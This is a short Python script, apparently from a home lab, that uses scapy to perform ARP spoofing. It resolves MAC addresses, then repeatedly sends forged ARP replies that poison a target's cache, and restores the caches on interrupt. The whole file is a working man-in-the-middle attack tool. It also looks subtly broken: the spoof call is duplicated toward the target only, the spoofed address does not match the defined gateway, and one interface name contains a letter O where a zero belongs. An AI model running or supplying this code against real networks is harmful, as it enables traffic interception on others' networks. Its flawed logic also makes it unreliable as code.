import scapy.all as sc
import time


def arp_spoof (target_ip, spoofed_ip, target_mac):
    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    sc.send(packet, verbose=False)


def get_mac_address(ip, iface=None):
    pkt = sc.Ether(dst="ff:ff:ff:ff:ff:ff")/sc.ARP(pdst=ip)
    ans =sc.srp(pkt, timeout=2, iface=iface, verbose=False)[0]
    if ans:
        return ans[0][1].hwsrc
    return None


target_ip ="192.168.56.101"
gateway_ip="10.0.3.2"


target_mac= get_mac_address(target_ip, iface="enp0s3")
gateway_mac=get_mac_address(gateway_ip, iface="enpOs8")


try:
    while True:
        print(target_ip)
        print(target_mac)
        print(gateway_ip)
        print(gateway_mac)
        arp_spoof(target_ip,"192.168.56.102", target_mac)
        arp_spoof(target_ip, "192.168.56.102", target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    sc.send(sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
    sc.send(sc.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)